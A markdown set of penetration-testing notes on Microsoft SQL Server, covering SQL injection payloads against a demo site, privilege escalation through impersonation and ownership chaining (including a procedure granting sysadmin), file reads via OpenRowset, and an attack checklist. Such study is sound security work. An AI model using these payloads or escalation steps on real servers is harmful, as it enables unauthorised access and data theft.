# MSSQL - Danger functionalities and misconfigurations

## Techniques
### Time Based
Req
```http
GET /Make/2?orderby=supercarid+WAITFOR+DELAY+'00:00:04'-- HTTP/2
Host: hack-yourself-first.com
```

### Boolean Based
Req
```http
GET /Make/2?orderby=(select+CASE+WHEN+(1=2)+THEN+'supercarid'+ELSE+(SELECT+1+Union+select+2)+END)-- HTTP/2
Host: hack-yourself-first.com
```
Response when false
```
Status code 500
Subquery returned more than 1 value
```

### Error Based
Req
```
GET /Make/2?orderby=(CONVERT(INT%2c@@version))-- HTTP/2
Host: hack-yourself-first.com
```
Response
```
Conversion failed when converting the nvarchar value 'Microsoft SQL Azure (RTM) - 12.0.2000.8 <br>	Nov &nbsp;2 2023 01:40:17 <br>	Copyright (C) 2022 Microsoft Corporation<br>' to data type int.</title>
```

### Stacked queried
Req
```
GET /Make/2?orderby=supercarid;WAITFOR+DELAY+'00:00:04'-- HTTP/2
Host: hack-yourself-first.com
```
## Concepts

### How MSSQL deal with login hash (https://www.linkedin.com/pulse/ms-sql-passwordhash-hash-p%C3%A9ter-kov%C3%A1cs/)

* The MS SQL Server builds (concatenate) the password_hash from three parts:
> 1. 0x0200 - a fixed prefix value, it means the version of the used hash algorythm, since SQL Server 2012 it's SHA2_512
> 2. salt - a 32 bit pseudo-random generated value, which provides every generation will result different password_hash
> 3. the real (raw) hash value of the concatenated plaintext password and the salt

* These four lines represent the password_hash generation method:
```
DECLARE @pwd NVARCHAR(MAX) = 'plaintext-password';
DECLARE @salt VARBINARY(4) = CRYPT_GEN_RANDOM(4);
DECLARE @hash VARBINARY(MAX);

SET @hash = 0x0200 + @salt + HASHBYTES('SHA2_512', CAST(@pwd AS VARBINARY(MAX)) + @salt);
```
> When a user try to log in with local sql account, the SQL Server can rebuild the raw hash with the original salt, because it's stored in plaintext in the password_hash, eight characters after the 0x0200 prefix. If the password is correct the rebuilt password_hash matches the stored version.

### How permissions works
* The primary identity is the login itself. The secondary identity includes permissions inherited from roles and groups.
* Every database user belongs to the public database role. When a user has not been granted or denied specific permissions on a securable, the user inherits the permissions granted to public on that securable. (https://learn.microsoft.com/en-us/previous-versions/sql/sql-server-2008-r2/ms181127(v=sql.105))

### Double and single quotes are treated differently in MSSQL

The reason why ```SELECT DB_NAME('1')``` works and ```SELECT DB_NAME("1")``` does not work is that double quotes are not interpreted the same way as single quotes in SQL Server.

When you use **double quotes**, SQL Server treats them as **delimiters for object identifiers, not as string delimiters**. In the case of the **DB_NAME function, it expects a string as an argument**, and this string should be delimited by single quotes.

Therefore, the DB_NAME function correctly receives the string "1" as an argument. **If you attempt to use double quotes, SQL Server will interpret it as an object identifier**, resulting in an error.

### "SELECT * FROM sysdatabases" works as "SELECT * FROM sys.databases" (With dots), why?
* The reason you can query "SELECT * FROM sysdatabases" without a dot is likely because you are using SQL Server Transact-SQL syntax that is compatible with older versions of SQL Server (SQL Server 2000 and earlier).
* In older versions of SQL Server, the system tables, such as "sysdatabases," were stored in the master database, and there was no need to use a dot (.) to specify the schema. Therefore, queries like "SELECT * FROM sysdatabases" were common in those versions.
* However, in more recent versions of SQL Server (SQL Server 2005 and onwards), the system views were introduced to replace the older system tables, and they are typically stored in the "sys" schema. As a result, the correct syntax for querying system views in newer versions is to use the "sys" schema, as in "SELECT * FROM sys.databases."

### SQL Link
* A SQL link from one SQL server to another simply enables you to perform queries against it. This is valuable if you need to collect and present data stored in multiple databases spread over multiple SQL servers (https://blog.improsec.com/tech-blog/dangers-mssql-features-impersonation-amp-links).

#### Grant permissions from user A to user B

* The authentication login is the entity that grants access to the server
```
CREATE LOGIN bruno WITH PASSWORD = 'Test@4567';
```
* The database user is the entity used to control access and permissions within a specific database
```
CREATE USER bruno FOR LOGIN bruno;
```

```
ALTER ROLE public ADD MEMBER bruno;
```
```
EXEC sp_addrolemember 'public', 'bruno';
```

* List users that can be impersonated
```
SELECT grantee_principal.name AS WhoCanImpersonate ,grantee_principal.type_desc AS ImpersonatorType ,sp.name AS WhoCanTheyImpersonate ,sp.type_desc AS ImpersonateeLoginType FROM sys.server_permissions AS prmssn INNER JOIN sys.server_principals AS sp ON sp.principal_id = prmssn.major_id AND prmssn.class = 101 INNER JOIN sys.server_principals AS grantee_principal ON grantee_principal.principal_id = prmssn.grantee_principal_id WHERE prmssn.state = 'G'
```

Result:
|WhoCanImpersonate|ImpersonatorType|WhoCanTheyImpersonate|ImpersonateeLoginType|
|-----------------|----------------|---------------------|---------------------|
|bruno            |SQL_LOGIN       |sa                   |SQL_LOGIN            |

### Impersonation - The problem(https://blog.improsec.com/tech-blog/dangers-mssql-features-impersonation-amp-links)
* You might have already guessed it. The problem is that you might not know exactly what permissions you acquire when using impersonation. Building on the example above, exactly which permissions does recipeadmin have? Might it have permissions on other databases, not intended for recipeuser to access? Might it even have administrative permissions on the SQL server itself?
### Privilege Creep
* This can happen when people change positions internally, and the permissions from the old position aren’t revoked when the change takes effect. Over time, this can accumulate and too many privileges are held. This can be combatted by implementing an Identity Governance model with periodic attestation of permissions.

How is this related to impersonation? Well, what happens when recipeadmin obtains new permissions? Recipeuser inherits them through the impersonation privilege, which isn’t necessarily intended

## Structure
* Master – All system objects to run the active relational database management system
* Model – Template database for new user defined databases and Tempdb when SQL Server starts
* TempDB – Stores all temporary objects such as #temp tables, ##temp tables, hash and sort records, etc.
* MSDB – Stores all SQL Server Agent related tables and stored procedures
* ResourceDB – Hidden and read-only database that includes all system objects

https://www.mssqltips.com/sqlservertip/6422/sql-server-concepts/

### Data types
![](https://www.mssqltips.com/tipimages2/6874_cast-sql-function.002.png)
https://www.mssqltips.com/sqlservertip/6874/sql-cast-function-for-data-type-conversions/

### Casting datas
#### CAST
* CAST function that is an ANSI standard and is cross platform compatible
```
select cast(@@version as int)
```
#### CONVERT
* The convert function is specific to Microsoft's T-SQL and will not function properly on other DBMSs, unlike the CAST function that is an ANSI standard and is cross platform compatible
```
select convert(int,@@version)
```
#### PARSE
* This function, like the CAST and CONVERT, return an expression translated to the requested data type. PARSE works fine converting from string to date/time and number types.
```
select PARSE(@@version as int)
```
### Data Output Format
* FOR JSON/XML AUTO
Querie
```
SELECT name FROM master..syslogins FOR JSON AUTO
```
Result
```
[{"name":"sa"},{"name":"##MS_SQLResourceSigningCertificate##"},{"name":"##MS_SQLReplicationSigningCertificate##"},{"name":"##MS_SQLAuthenticatorCertificate##"},{"name":"##MS_PolicySigningCertificate##"},{"name":"##MS_SmoExtendedSigningCertificate##"},{"name":"##MS_PolicyEventProcessingLogin##"},{"name":"##MS_PolicyTsqlExecutionLogin##"},{"name":"##MS_AgentSigningCertificate##"},{"name":"BUILTIN\\Administrators"},{"name":"NT AUTHORITY\\SYSTEM"},{"name":"NT AUTHORITY\\NETWORK SERVICE"}]
```
> Note: "JSON PATH" is frequently referenced, but it is most commonly used when constructing a query and you want to specify how the JSON output will be formatted.

* STRING_AGG(TABLE_NAME,DELIMITER)
Querie
```
SELECT STRING_AGG(name, ',') FROM sys.databases
```
Result
```
master,tempdb,model,msdb
```

### SQL Agent (https://www.blackhat.com/presentations/win-usa-03/bh-win-03-cerrudo/bh-win-03-cerrudo.pdf)
* Used to run jobs and perform maintenance tasks on a scheduled tasks;
* If you configured SQL Agent to connect using SQL Server authentication
* Then
  * A sysadmin login and password must be recorded;
  * The password is saved encoded in LSA secrets key;
  * SQL Agent must run under Windows administrative account to retrieve password from LSA secrets key;

### Views and stored procedures
* Object such as stored procedures and views can references other objects
* If object owner of both objects are the same
  * Permissions are not checked on the referenced objects
  * SQL Server assumes object owner would not reference objects that unless owner meant it
* Referred to as ownership chaining

### Cross-database ownership
* If sa login is the database owner of a database, then sa login is mapped to the dbo user
* All users granted the db_owner role can create objects and designate them as owned by dbo
* What happens when
  * A view or stored procedure references object in a different
database
  * View or procedure is owned by dbo
  * Object is owned by a different dbo in a different database
* Test this concept
```
use testdatabase
create proc dbo.test as
select * from master.dbo.sysxlogins
go
exec test
```
* Guess what – it works!!!
* Retrieves sysxlogin from master database

#### Why does this work?
* SQL Server performs access control by
  * Checking permissions on stored procedures first
  * Gets the SID (0x01 sa SID) of the user (dbo) in the current database that owns the stored procedure
* Compares the SID with the SIDs of the owners of the objects referenced in the stored procedure
* Because the SID of the owner of the stored procedure match the SID of the owner of the objects referenced in the stored procedure - it works!!!
* Access controls not designed to handle a user:
  * Granted the db_owner role but is not the dbo
  * Is not a member of sysadmin role
  * That creates a stored procedure as the dbo user
  * Doesn’t have permissions in objects referenced in the SP
* Applies to views, triggers and user defined functions
* Any db_owner can impersonate sa when sa is dbo:
```
-- Assume 'TestDB' is the name of the database
USE TestDB;

-- Create a user and make them a member of the db_owner role
CREATE LOGIN TestUser WITH PASSWORD = 'StrongPassword';
CREATE USER TestUser FOR LOGIN TestUser;
ALTER ROLE db_owner ADD MEMBER TestUser;

-- Set sa as the owner of the database
ALTER AUTHORIZATION ON DATABASE::TestDB TO sa;

-- Now, TestUser can impersonate sa within TestDB
EXECUTE AS USER = 'sa';

-- Check the current user (should show sa)
SELECT SUSER_SNAME();

-- Revert back to the original user
REVERT;
```
* Also works when using Windows Authentication

### Thoughts and Workflow made by MSDAT, good to do a checklist (msdat: https://github.com/quentinhardy/msdat)
* Can the current user become sysadmin with trustworthy database method?
* You can steal hashed passwords?
* Can we execute system commands with xpcmdshell (directly)?
* Can we re-enable xpcmdshell to use xpcmdshell?
* Can you use SQL Server Agent Stored Procedures (jobs) to execute system commands?
* Can you capture a SMB authentication?
* Can you use OLE Automation to read files?
* Can you use OLE Automation to write files?
* Can you use OLE Automation to execute Windows system commands?
* Can you use Bulk Insert to read files?
* Can you use Openrowset to read files?
* Can you connect to remote databases with openrowset? (useful for dictionary attacks)
* Can you list files with xp_dirtree?
* Can you list directories with xp_subdirs?
* Can you list drives with xp_subdirs?
* Can you list medias with xp_availablemedia?
* Can you check if a file exist thanks to xp_fileexist?
* Can you create a folder with xp_createsubdir?

### Create a stored procedure in current database
```
CREATE PROCEDURE IMDATELOHJOSUUSOOJAHMSAT WITH EXECUTE AS OWNER AS EXEC sp_addsrvrolemember 'bruno','sysadmin'
```

## Useful Queries
### List all roles
```
Select [name] From sysusers
```
### Check the current context and who owns each database available:
```
SELECT name AS 'Current Database', SUSER_SNAME() AS 'Current User', SUSER_SNAME(owner_sid) AS 'Database Owner'
FROM sys.databases
```
### Read localfile through errors
```
Select cast((select x from OpenRowset(BULK '/etc/hosts',SINGLE_CLOB) R(x)) as int) 
```
* ```display_errors``` should be enabled on PHP configuration

### Get database physical path
```
SELECT TOP 1 physical_name FROM sys.master_files
```
Response:
```
/var/opt/mssql/data/master.mdf
```
### Get connected clients
Req:
```
SELECT * FROM sys.dm_exec_connections
```
Response:

|session_id|most_recent_session_id|connect_time           |net_transport|protocol_type|protocol_version|endpoint_id|encrypt_option|auth_scheme|node_affinity|num_reads|num_writes|last_read              |last_write             |net_packet_size|client_net_address|client_tcp_port|local_net_address|local_tcp_port|connection_id                       |parent_connection_id|most_recent_sql_handle                      |
|----------|----------------------|-----------------------|-------------|-------------|----------------|-----------|--------------|-----------|-------------|---------|----------|-----------------------|-----------------------|---------------|------------------|---------------|-----------------|--------------|------------------------------------|--------------------|--------------------------------------------|
|        51|                    51|2024-01-19 01:44:56.613|TCP          |TSQL         |      1946157060|          4|FALSE         |NTLM       |            0|      126|       293|2024-01-19 01:49:45.273|2024-01-19 01:49:45.337|           8000|127.0.0.1         |          58489|127.0.0.1        |          1433|15DEDE33-4052-4D81-BE46-5E93C8F38D99|                    |    Ò ï ¼Ë ãX  :¡%1ðT wµ                    |
|        53|                    53|2024-01-19 01:36:11.347|TCP          |TSQL         |      1946157060|          4|FALSE         |SQL        |            0|        6|         6|2024-01-19 01:36:12.827|2024-01-19 01:36:12.830|           8000|181.0.0.0     |          51370|172.0.0.0       |          1433|9D3292D0-38AF-42E2-BE7A-5FC8C05E7114|                    |    Þà  Pù-                                 |
|        54|                    54|2024-01-19 01:36:13.420|TCP          |TSQL         |      1946157060|          4|FALSE         |SQL        |            0|        8|         8|2024-01-19 01:48:46.073|2024-01-19 01:48:46.100|           8000|181.0.0.0     |          17277|172.0.0.0      |          1433|AF4ABE7F-E3E2-4496-8A14-2D08C24C87E2|                    |    C|V \} °|õ |r æL  I{                    |
|        52|                    52|2024-01-19 01:11:58.620|TCP          |TSQL         |      1946157060|          4|FALSE         |SQL        |            0|        5|         5|2024-01-19 01:12:03.120|2024-01-19 01:12:03.120|           8000|181.0.0.0     |           1303|172.0.0.0       |          1433|4567D355-A061-43FE-A9D9-705D564A5642|                    |    6   °°¨                                 |
|        55|                    55|2024-01-19 01:12:04.157|TCP          |TSQL         |      1946157060|          4|FALSE         |SQL        |            0|       14|        14|2024-01-19 01:51:13.087|2024-01-19 01:51:13.113|           8000|181.0.0.0     |          46413|172.0.0.0       |          1433|13274458-EF93-4E2A-A28A-253BB19EFE5C|                    |    óO  ° Ôºav~`´R|ÂOÂE                     |
|        57|                    57|2024-01-19 01:12:10.340|TCP          |TSQL         |      1946157060|          4|FALSE         |SQL        |            0|        5|         5|2024-01-19 01:12:13.313|2024-01-19 01:12:13.317|           8000|181.0.0.0      |          57443|172.0.0.0       |          1433|1D08F24B-612C-4A75-84B1-125425306285|                    |    Þà  Pù-                                 |
|        58|                    58|2024-01-19 01:12:13.753|TCP          |TSQL         |      1946157060|          4|FALSE         |SQL        |            0|       34|        33|2024-01-19 01:51:24.403|2024-01-19 01:51:24.123|           8000|181.0.0.0     |           1306|172.0.0.0       |          1433|AEBA9589-BFB3-44D9-83E0-53B8D362478F|                    |    Á ',ô  H] è £ ±ô¶¡è                     |
|        56|                    56|2024-01-19 01:36:15.237|TCP          |TSQL         |      1946157060|          4|FALSE         |SQL        |            0|       17|        17|2024-01-19 01:48:47.610|2024-01-19 01:48:47.610|           8000|181.0.0.0      |          30291|172.0.0.0       |          1433|E8191B45-7947-42A3-B238-2A4ACEA7C8AB|                    |    6   °°¨                                 |


### Get current querie
```
select text from sys.dm_exec_requests cross apply sys.dm_exec_sql_text(sql_handle)
```

**CAUTION**
The following query should be executed with caution as it has the potential to impact the performance of MSSQL, depending on the size of the table entries returned. It is recommended to run it only when there is confidence that the returned row isn't excessively long.

### DUMP all in one shot using XML
Request (for JSON auto could be also used)
```
(select * from master..sysdatabases) for xml PATH('')
```
Response
```
<name>master</name><dbid>1</dbid><sid>AQ==</sid><mode>0</mode><status>65544</status><status2>
```
## How MSSQL checks if current user has permissions to execute some querie (Step by Step):
### 1. Authentication
* When a user attempts to connect to SQL Server, the server checks the sys.server_principals and sys.sql_logins system views.
* These views contain information about server-level principals (logins and users) and their authentication properties.
* Authentication involves validating the user's credentials, such as username and password, against the entries in these system views.
* The sys.server_principals view, for example, includes columns like name (login or user name) and type_desc (indicating whether it's a SQL login or Windows login).

### 2. Authorization (Server-Level)
* The server checks server-level permissions by querying the sys.server_role_members and sys.server_principals system views.
* The sys.server_role_members view lists the members of server roles, and sys.server_principals provides details about server-level principals.
* Server roles define sets of permissions, and the server verifies whether the user is a member of any roles that have the necessary permissions.

### 3. Database Selection

* The server checks the existence of the selected database by querying the sys.databases system view.
The sys.databases view contains information about all databases on the server, and the server ensures that the chosen database exists and is accessible to the user.

### 4. Database User Mapping
* The server maps the authenticated login to a database user using the sys.database_principals and sys.database_role_members system views.
sys.database_principals contains information about database users, and sys.database_role_members identifies the roles associated with the database user.
* The mapping ensures that the user has a corresponding identity within the selected database.

### 5. Role Membership
* The server checks database-level roles and their memberships using sys.database_role_members and sys.database_principals.
* Database roles define sets of permissions within a specific database, and the server verifies whether the user is a member of any roles that grant the necessary permissions.

### 6. Object-Level Permissions
* The server examines object-level permissions by querying the sys.objects and sys.database_permissions system views.
sys.objects provides information about the objects (e.g., tables, views), and sys.database_permissions contains details about the permissions granted on those objects.
* The server checks if the user has the required permissions (e.g., SELECT, INSERT) on the objects referenced in the query.

### 7. Ownership Chaining
* Ownership chaining involves checking ownership of objects, typically managed through sys.objects (for object ownership) and sys.schemas (for schema ownership).
* If a user has permissions on a stored procedure or view, and that object references a table, ownership chaining allows access to the table without requiring explicit permissions on the table.

### 8. Effective Permissions
* The server calculates effective permissions by using functions like fn_my_permissions and querying sys.database_permissions.
fn_my_permissions provides information about the permissions the user has on a specific securable, and sys.database_permissions contains details about all database permissions.

### 9. Query Execution
* If all permission checks pass, the server proceeds with query execution.
If there are insufficient permissions, the user receives an error indicating the nature of the permission violation.

## Resources
* https://www.sqlservertutorial.net/
* https://github.com/ktaranov/sqlserver-kit
* https://github.com/quentinhardy/msdat
* https://blog.improsec.com/tech-blog/dangers-mssql-features-impersonation-amp-links
* https://web.archive.org/web/20220331031141/https://www.allenkinsel.com/archive/2013/12/finding-impersonation-info-in-sql-server/
* https://blog.improsec.com/tech-blog/dangers-mssql-features-impersonation-amp-links
* https://www.madeiradata.com/post/how-to-protect-sql-server-from-hackers-and-penetration-tests

## Local Lab
Docker instance
```
docker run -e "ACCEPT_EULA=Y" -e 'MSSQL_SA_PASSWORD=yourStrong(!)Password' -p 1433:1433 -d mcr.microsoft.com/mssql/server:2019-latest
```
